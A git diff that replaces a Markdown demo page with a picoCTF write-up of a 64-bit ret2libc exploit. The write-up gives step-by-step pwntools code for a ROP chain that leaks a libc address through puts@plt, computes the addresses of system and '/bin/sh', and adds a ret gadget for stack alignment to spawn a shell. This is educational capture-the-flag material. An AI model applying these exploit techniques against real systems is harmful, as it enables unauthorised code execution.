@@ -1,710 +1,558 @@
-# My Open Publishing Space
+# ROP-Based ret2libc on 64-bit Systems
 
-## Create, Share and Collaborate
+>**Threat Model:** The attacker can trigger a stack-based buffer overflow through crafted input, gaining control over the return address.
 
-![Photo of Mountain](images/mountain.jpg) buuuu
-
-[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
-
-## Introduction
-
-**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
-
-![Figure 1: The Markdown Mark](images/markdown-red.png)
-
-Some of the key benefits are:
-
-1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
-2. Less chance of errors when writing in markdown.
-3. Produces valid XHTML output.
-4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
-5. Write in any text editor or Markdown application you like.
-6. Markdown is a joy to use!
-
-John Gruber[^1], the author of Markdown, puts it like this:
-
-> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
-> -- <cite>John Gruber</cite>
-
-
-Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:
-
-### Headings
-
-Headings from `h1` through `h6` are constructed with a `#` for each level:
-
-```markdown
-# h1 Heading
-## h2 Heading
-### h3 Heading
-#### h4 Heading
-##### h5 Heading
-###### h6 Heading
-```
-
-Renders to:
-
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
-
-HTML:
-
-```html
-<h1>h1 Heading</h1>
-<h2>h2 Heading</h2>
-<h3>h3 Heading</h3>
-<h4>h4 Heading</h4>
-<h5>h5 Heading</h5>
-<h6>h6 Heading</h6>
-```
-
-### Comments
-
-Comments should be HTML compatible
-
-```html
-<!--
-This is a comment
--->
-```
-Comment below should **NOT** be seen:
-
-<!--
-This is a comment
--->
-
-### Horizontal Rules
-
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
-
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
-
-renders to:
-
-___
 
 ---
 
-***
+## Tools used
+ Python 3, Pwntools, GDB + GEF, Ghidra, pwninit, Docker, checksec, patchelf, readelf, strings, ldd, subl   
+
+> **Note**: All the analysis and exploitation tasks were performed inside a **Debian 12 virtual machine**, running on **VirtualBox**.
+
+---
+
+## Attack Summary
+
+This attack uses stack overflow to hijack control flow and reuse libc functions instead of injecting shellcode.
+
+### Protections bypassed
+
+- **ASLR (Address Space Layout Randomization)**: bypassed by leaking a libc address and calculating function locations using known **offsets**.
+- **NX (Non-Executable Stack)**: bypassed by **reusing existing code** in the binary and libc.
+- **Stack Smashing**: used to overflow the buffer and overwrite the return address (`RIP`) with controlled values.
+
+### Payloads
+
+- **Payload 1**: Leaks the real address of `setbuf` by calling `puts(setbuf@got)`, which goes through `puts@plt` → `puts@libc`. Then returns to main.
+- **Payload 2**: Calls `system("/bin/sh")` using computed libc addresses. Includes `pop rdi` gadget and `ret` for stack alignment.
 
 
-### Body Copy
+![alt text](stackdrawio-1.png)
+*Figure 1: Simplified stack layout.*
 
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
+> The call to `puts(setbuf@got)` jumps through the PLT and ends up calling the real `puts` inside libc. That function then **reads the pointer stored in `setbuf@got`**, which contains the **actual address of `setbuf` in libc**, and prints it.
+---
 
-So this body copy:
+## Step-by-step Description:
+### 1. Environment Setup:
 
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
-```
-renders to this HTML:
+#### Download files
 
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
-```
+Challenge binary 'vuln' and libc were provided from picoCTF 2021:
 
-### Emphasis
-
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
-
-The following snippet of text is **rendered as bold text**.
-
-```markdown
-**rendered as bold text**
-```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
-```
-
-#### Italics
-For emphasizing a snippet of text with italics.
-
-The following snippet of text is _rendered as italicized text_.
-
-```markdown
-_rendered as italicized text_
+```bash
+wget https://artifacts.picoctf.net/c/179/file_name
 ```
 
-renders to:
+#### Segfault on execution
 
-_rendered as italicized text_
-
-and this HTML:
-
-```html
-<em>rendered as italicized text</em>
+```bash
+./vuln # Segmentation fault (core dumped)
 ```
 
+Caused by incompatible `libc` version.
 
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
+#### Identifying libc version
 
-```markdown
-~~Strike through this text.~~
+* `strings libc.so.6 | grep -i version` → `GLIBC 2.27`
+* `ldd vuln` + `strings /lib64/ld-linux-x86-64.so.2 | grep version` → host libc `2.36`
+
+
+#### Matching the linker
+
+**Method 1 — Docker**
+
+```bash
+docker run -it ubuntu:19.04  # ld-2.29.so
 ```
-Which renders to:
+It works but we have to repeat the process with guess-and-check.
 
-~~Strike through this text.~~
+**Method 2 — pwninit (preferred)**
 
-HTML:
+pwninit is a tool that automates the initial setup for binary exploitation challenges. It detects the binary and its associated libc and downloads the correct dynamic linker (ld). 
 
-```html
-<del>Strike through this text.</del>
+```bash
+ /opt/pwninit/pwninit 
+ ```
+
+→ Fetches `ld-2.27.so` automatically.
+
+![pwninit](image-1.png)
+*Figure 2: Fetching the linker with pwninit.*
+
+#### Running the binary
+
+```bash
+patchelf --set-interpreter ./ld-2.27.so ./vuln
+./vuln
 ```
+To run it without specifying the linker every time.
 
-### Blockquotes
-For quoting blocks of content from another source within your document.
+---
 
-Add `>` before any text you want to quote.
+### 2. Protections of the binary
 
-```markdown
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
+```bash
+checksec ./vuln
 ```
+  - **Partial RELRO**: The GOT is writable, making GOT overwrite attacks possible.
+  - **No Stack Canary**: The binary lacks stack protection, allowing buffer overflows.
+  - **NX Enabled**: The stack is non-executable; direct shellcode injection won't work 
+  - **No PIE**: The binary loads at a fixed address (`0x400000`), ASLR won't affect the binary
+  - **Custom RUNPATH**: The binary uses a local `libc.so.6`, which we can control 
+- **Not Stripped**: Symbols are preserved, making reverse engineering and identifying functions easier
 
-Renders to:
+---
 
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
+### 3. Input parsing in the vulnerable program
+I opened the vuln binary using Ghidra, an open-source reverse engineering tool. Ghidra lets me inspect the binary at both the C pseudo-code and assembly levels, which is essential for calculating offsets and identifying potential vulnerabilities during exploitation.
 
-and this HTML:
+Inside the main function, I found a call to a function named do_stuff. Upon analyzing do_stuff, I discovered a critical scanf call that can lead to a buffer overflow:
 
-```html
-<blockquote>
-  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
-</blockquote>
-```
+The program uses two `scanf` calls to parse user input:
 
-Blockquotes can also be nested:
-
-```markdown
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-```
-
-Renders to:
-
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-
-### Lists
-
-#### Unordered
-A list of items in which the order of the items does not explicitly matter.
-
-You may use any of the following symbols to denote bullets for each list item:
-
-```markdown
-* valid bullet
-- valid bullet
-+ valid bullet
-```
-
-For example
-
-```markdown
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-```
-Renders to:
-
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-
-And this HTML
-
-```html
-<ul>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit
-    <ul>
-      <li>Phasellus iaculis neque</li>
-      <li>Purus sodales ultricies</li>
-      <li>Vestibulum laoreet porttitor sem</li>
-      <li>Ac tristique libero volutpat at</li>
-    </ul>
-  </li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ul>
+```c
+char allocated_buffer[112];
+undefined local_89;
+[...]
+__isoc99_scanf("%[^n]", allocated_buffer);
+__isoc99_scanf("%c", &local_89);
 ```
 
-#### Ordered
-
-A list of items in which the order of items does explicitly matter.
-
-```markdown
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-```
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-And this HTML:
-
-```html
-<ol>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit</li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ol>
-```
-
-**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:
-
-```markdown
-1. Lorem ipsum dolor sit amet
-1. Consectetur adipiscing elit
-1. Integer molestie lorem at massa
-1. Facilisis in pretium nisl aliquet
-1. Nulla volutpat aliquam velit
-1. Faucibus porta lacus fringilla vel
-1. Aenean sit amet erat nunc
-1. Eget porttitor lorem
-```
-
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-### Code
-
-#### Inline code
-Wrap inline snippets of code with `` ` ``.
-
-```markdown
-In this example, `<section></section>` should be wrapped as **code**.
-```
-
-Renders to:
-
-In this example, `<section></section>` should be wrapped with **code**.
-
-HTML:
-
-```html
-<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
-```
-
-#### Indented code
-
-Or indent several lines of code by at least four spaces, as in:
-
-<pre>
-  // Some comments
-  line 1 of code
-  line 2 of code
-  line 3 of code
-</pre>
-
-Renders to:
-
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-
-HTML:
-
-```html
-<pre>
-  <code>
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-  </code>
-</pre>
-```
-
-
-#### Block code "fences"
-
-Use "fences"  ```` ``` ```` to block in multiple lines of code.
-
-<pre>
-``` markup
-Sample text here...
-```
-</pre>
-
+If the user inputs:
 
 ```
-Sample text here...
+AAAA...AAAA<112 chars total>\n
 ```
 
-HTML:
+* The first `scanf` stores everything before the newline into `allocated_buffer` (can cause a buffer overflow)
+* The second `scanf` reads the `\n` and stores it in `local_89`.
 
-```html
-<pre>
-  <code>Sample text here...</code>
-</pre>
+#### Debugging the vulnerability with GDB
+
+To analyze the overflow, I opened the vulnerable program with GDB:
+
+```bash
+gdb ./vuln
+r
 ```
 
-#### Syntax highlighting
+Then, I input a long sequence of `A`'s (more than 112 characters) to overflow the buffer.
 
-GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:
+####  How Registers Work in 64-bit Systems
 
-<pre>
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-</pre>
+| Register | Purpose |
+|----------|---------|
+| `RIP`    | **Instruction Pointer** – holds the address of the next instruction to execute. |
+| `RSP`    | **Stack Pointer** – points to the top of the stack. |
+| `RBP`    | **Base Pointer** – used to reference local variables on the stack. |
+| `RAX`    | **Return value** of functions. |
+| `RDI`    | **First** function argument. |
+| `RSI`    | Second argument. |
+| `RDX`    | Third argument. |
+| `RCX`, `R8`, `R9` | Fourth, fifth, and sixth arguments respectively. |
 
-Renders to:
+These follow the **System V AMD64 ABI** calling convention, which is standard on Linux systems. 
 
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
+#### Why "A" doesn't appear in RIP?
+
+After the crash, examining the registers shows that the `RIP` does **not** contain the `A`'s. This is expected because in 64-bit systems:
+
+> The `ret` instruction doesn’t directly use the RIP. Instead, it pops an address from the **stack** and jumps to it.
+
+So if the stack contains a value like `0x4141414141414141` (from our input), the CPU tries to jump to that address. Since it's invalid, the program **crashes before RIP is updated**.
+
+
+
+
+![gdb ](image-4.png)
+*Figure 3: gdb debugging after overflow.*
+
+#### Finding the exact offset with cyclic pattern:
+
+Now, let’s figure out how many bytes it takes to reach the return address. GEF makes this easy:
+
+```bash
+pattern create 200
 ```
 
-### Tables
-Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.
+This creates a 200-byte cyclic pattern (De Bruijn sequence) where every 8-byte sequence is unique.
 
+In Ghidra, we see that the buffer is 112 bytes, but **remember**:
 
-```markdown
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+* After the buffer, the stack may contain saved RBP, stack canary (if any), and finally the return address.
+* So we need to overflow beyond just 112 bytes.
+
+A good trick is to round up — in this case, we try 200 bytes.
+
+After crashing the program with the pattern, use:
+
+```bash
+pattern offset $rsp # Offset found at 136
 ```
 
-Renders to:
+This means we need to send 136 bytes to reach RIP.
 
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+>**Note**: When the program crashes, you look at the `$rsp` register, which points to the stack where the return address is stored. If `$rsp` contains 8 bytes from your pattern, you can say: "These 8 bytes appear at position X in the pattern."
+So, X is the number of bytes you wrote before reaching the return address.
 
-And this HTML:
 
-```html
-<table>
-  <tr>
-    <th>Option</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>data</td>
-    <td>path to data files to supply the data that will be passed into templates.</td>
-  </tr>
-  <tr>
-    <td>engine</td>
-    <td>engine to be used for processing templates. Handlebars is the default.</td>
-  </tr>
-  <tr>
-    <td>ext</td>
-    <td>extension to be used for dest files.</td>
-  </tr>
-</table>
+
+
+---
+
+### 4.  Start writing the exploit
+
+Open the exploit script with:
+
+```bash
+subl attempt.py
 ```
 
-### Right aligned text
+Start coding payload:
 
-Adding a colon on the right side of the dashes below any heading will right align text for that column.
+```python
+#!/usr/bin/env python3
+from pwn import *  # Easy and useful for exploit development
 
-```markdown
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+p = process("./vuln")  # Launch the vulnerable binary
+
+offset = 136
+junk = b"A" * offset  # Padding to reach the return address
+```
+---
+
+### 5. Leaking a libc address using a ROP Chain
+
+
+We enable ASLR (Address Space Layout Randomization) to add memory randomness:
+
+```bash
+gef➤  aslr on
 ```
 
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
+Even with ASLR enabled, **function offsets remain the same**. If we leak the address of one function, we can calculate the others relative to it.
 
-### Links
 
-#### Basic link
+#### How to leak a libc address
+To leak a libc address, use:
 
-```markdown
-[Assemble](http://assemble.io)
+- **GOT** (Global Offset Table): stores function addresses (writable with partial RELRO)
+
+- **PLT** (Procedure Linkage Table): jumps to GOT entries (executable)
+
+.plt → .got.plt → libc
+
+Example: setbuf
+→ jumps to .plt → reads .got.plt 
+→ if unresolved, resolves it; else, jumps to libc function
+
+
+
+#### ROP (Return-Oriented Programming)
+
+To print the libc address, we need to chain instructions (gadgets) ending in `ret` to build a fake call:
+
+1. Find a ROP gadget to control `RDI` (the first argument of a function in x86\_64):
+
+```bash
+ROPgadget --binary vuln | grep ": pop" 
+ # pop_rdi = 0X400913
 ```
 
-Renders to (hover over the link, there is no tooltip):
+![ropgadgets](image-6.png)
+*Figure 4: Searching for ROPgadgets.*
 
-[Assemble](http://assemble.io)
+2. Using **Ghidra**, I was able to identify the following important addresses needed for constructing the ROP chain:
 
-HTML:
-
-```html
-<a href="http://assemble.io">Assemble</a>
+```bash
+setbuf_at_got = 0x601038
+puts_at_plt = 0x400540
+back_to_main = 0x400771
 ```
 
+![ghidra](ghidra.png)
+*Figure 5: PLT address of puts() on Ghidra.*
 
-#### Add a title
+#### ROP Chain:
 
-```markdown
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
+```python
+payload = [
+    junk,  # Overflow buffer with junk to reach return address
+
+    # Step 1: pop the address into rdi (1st function argument in 64-bit calling convention)
+    p64(pop_rdi),           # Gadget: pop rdi ; ret
+    p64(setbuf_at_got),     # Argument to puts: the address of setbuf in GOT
+
+    # Step 2: Call puts@plt to print the real address of setbuf from GOT
+    p64(puts_at_plt),       
+
+    # Step 3: Return to main to restart the program and allow sending a second payload
+    p64(back_to_main),      
+]
+
+# Send the payload to the program
+payload = b"".join(payload)
+p.sendline(payload)
 ```
 
-Renders to (hover over the link, there should be a tooltip):
+> **Note**: Pack values with p64() in the payload because I'm writing directly to the program's memory (on the stack), and the CPU expects them in 64-bit binary format. p64() converts a number (e.g., 0x400540) into an 8-byte sequence in little-endian format.
+---
 
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
+### 6. Taking advantage of the memory leak
 
-HTML:
+#### Receiving the leaked address
 
-```html
-<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
+To skip over the first initial output lines and reach the actual leaked value, we add calls to `p.recvline()`:
+
+```python
+p.recvline()  # skip "WeLcOmE tO My EcHo SeRvEr!"
+p.recvline()  # skip input "AAAAAAAAAAAAA"
+leak = p.recvline()
+log.info(f"{hex(leak)=}")  # use log.info() for a clear output
+```
+![running](image-8.png)
+*Figure 6: Leak variable stored in little-endian format.*
+
+
+#### Unpacking the leak
+
+We need to convert the string using `u64()` that expects exactly 8 bytes. If the string is shorter (e.g., 6 bytes), we pad it with null bytes using `.ljust(8, b"\x00")`.
+ `strip()` removes the newline at the end of the stack.
+
+```python
+leak = u64(leak.strip().ljust(8, b"\x00"))
+```
+### 7. Finding the libc base address
+
+We use readelf to extract function offsets from the libc binary, which allows us to calculate their real addresses in memory once we know the libc base address.
+
+```bash
+readelf -s ./libc.so.6 | grep setbuf 
 ```
 
-#### Named Anchors
+Then compute:
 
-Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:
-
-```markdown
-# Table of Contents
-  * [Chapter 1](#chapter-1)
-  * [Chapter 2](#chapter-2)
-  * [Chapter 3](#chapter-3)
+```python
+base_address_of_libc = leak - setbuf_offset
 ```
-will jump to these sections:
 
-```markdown
-### Chapter 1 <a id="chapter-1"></a>
-Content for chapter one.
+#### Find offsets for `system` and `/bin/sh`
 
-### Chapter 2 <a id="chapter-2"></a>
-Content for chapter one.
-
-### Chapter 3 <a id="chapter-3"></a>
-Content for chapter one.
+```bash
+readelf -s ./libc.so.6 | grep system
+strings -tx libc.so.6 | grep /bin/sh
 ```
-**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.
 
-### Images
-Images have a similar syntax to links but include a preceding exclamation point.
+Then compute their actual addresses:
 
-```markdown
-![Image of Minion](https://octodex.github.com/images/minion.png)
+```python
+system_address = base_address_of_libc + system_offset
+bin_sh_address = base_address_of_libc + bin_sh_offset
 ```
-![Image of Minion](https://octodex.github.com/images/minion.png)
 
-and using a local image (which also displays in GitHub):
+#### Final ROP chain to get shell
 
-```markdown
-![Image of Octocat](images/octocat.jpg)
+```python
+second_payload = [
+    junk,
+    p64(pop_rdi),
+    p64(bin_sh_address),      # First argument to system()
+    p64(system_address),      # Call system("/bin/sh")
+]
+
+second_payload = b"".join(second_payload)
+p.sendline(second_payload)
+p.interactive()              # Get interactive shell
 ```
-![Image of Octocat](images/octocat.jpg)
+---
 
-## Topic One  
+### 8. GDB debugging 
 
-Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.
+```python
+p = process("./vuln")
+gdb.attach(p)
+```
+so when we run the script it will open automatically the debugger.
 
-## Topic Two
 
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
+1. **Disassemble the function**:
 
-## Topic Three
+  ```bash
+   disassemble do_stuff
+   ```
+   Take the **last `ret` instruction**. In this case, it’s at address `0x400770`. 
 
-### Overview
 
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
+2. **Set a breakpoint at the return**:
 
-### Subtopic One
+  ```bash
+   b *0x400770
+   ```
 
-Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
-rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
-vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
-lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
-limenque per ferre graves causa neque credi epulasque isque celebravit pisces.
+3. **Run the program** and continue:
 
-- Iasone filum nam rogat
-- Effugere modo esse
-- Comminus ecce nec manibus verba Persephonen taxo
-- Viribus Mater
-- Bello coeperunt viribus ultima fodiebant volentem spectat
-- Pallae tempora
+ ```bash
+   c
+   ```
 
-#### Fuit tela Caesareos tamen per balatum
+4. **Step through instructions**:
 
-De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
-puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
-tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
-hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
-te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
-sceleris inquit operatus, abundet **excipit has**.
+  ```bash
+   si
+   ```
 
-In locumque *perque* infelix hospite parente adducto aequora Ismarios,
-feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
-similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
-genero, virtus rite.
+![debugging](image-10.png)
+*Figure 7: Dynamic debugging session.*
 
-- Citius chlamydis saepe colorem paludosa territaque amoris
-- Hippolytus interdum
-- Ego uterque tibi canis
-- Tamen arbore trepidosque
+At this point, `/bin/sh` is on the stack, but the exploit **fails to spawn a shell**. Why?
 
-#### Colit potiora ungues plumeus de glomerari num
 
-Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
-**est aevi** esse riget agmenque nutrit fugacis.
+#### The problem: Stack Alignment
 
-- Coortis vox Pylius namque herbosas tuae excedere
-- Tellus terribilem saetae Echinadas arbore digna
-- Erraverit lectusque teste fecerat
+On 64-bit Linux systems, the **System V AMD64 ABI** requires:
 
-Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
-caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.
+> The stack pointer (`%rsp`) must be 16-byte aligned before any function call.
 
-### Subtopic Two
+If `%rsp` is not aligned (e.g., the last digit of its address is not `0`), calling `system()` (or other libc functions) may cause a **segmentation fault (SIGSEGV)**.
 
-Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
-spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
-cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
-[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
-contingat militis concitus, ad!
+#### Fix: Insert a `ret` gadget
 
-#### Et omnis blanda fetum ortum levatus altoque
+Find a simple `ret` instruction using ROPgadget:
 
-Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
-absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
-aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
-et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
-metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
-sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
-*hectora candidus*!
+```bash
+ROPgadget --binary vuln | grep ": ret"
+```
 
-#### Et hanc
+Suppose it returns `0x40052e`, then we update the payload like this:
 
-Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
-nitidique! Ignavo tibi in perdam, est tu precantia fuerat
-[revelli](http://jaspervdj.be/).
+```python
+ret_instruction = 0x40052e  # Single ret for alignment
 
-Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
-super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
-plus *cum ignes nondum*, fata sum arcus lustraverat tantis!
+second_payload = [
+    junk,
+    p64(pop_rdi),             # 8 bytes
+    p64(bin_sh_address),      # 8 bytes
 
-#### Adulterium tamen instantiaque puniceum et formae patitur
+     # At this point, we've added 136 + 8 + 8 = 152 bytes total,
+     # so %rsp ends in ...f8 (not aligned to 16 bytes).
+   
+    p64(ret_instruction),     # it pops an extra 8 bytes
+                              # moving %rsp from ...f8 to ...00 (properly aligned)
+    p64(system_address),
+]
+```
 
-Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
-triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
-cacumine dei malum solus.
+#### Results
 
-1. Mansit post ambrosiae terras
-2. Est habet formidatis grandior promissa femur nympharum
-3. Maestae flumina
-4. Sit more Trinacris vitasset tergo domoque
-5. Anxia tota tria
-6. Est quo faece nostri in fretum gurgite
+Now, with proper stack alignment, the call to `system("/bin/sh")` works as expected, and you get a shell! 
 
-Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
-habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
-loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
-ignescere eburno e decolor terga.
+![interactive shell](image-9.png)
+*Figure 8: Interactive shell.*
 
-> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
+---- 
 
-[^1]: [Markdown - John Gruber](https://daringfireball.net/projects/markdown/)
+### 9. Optional
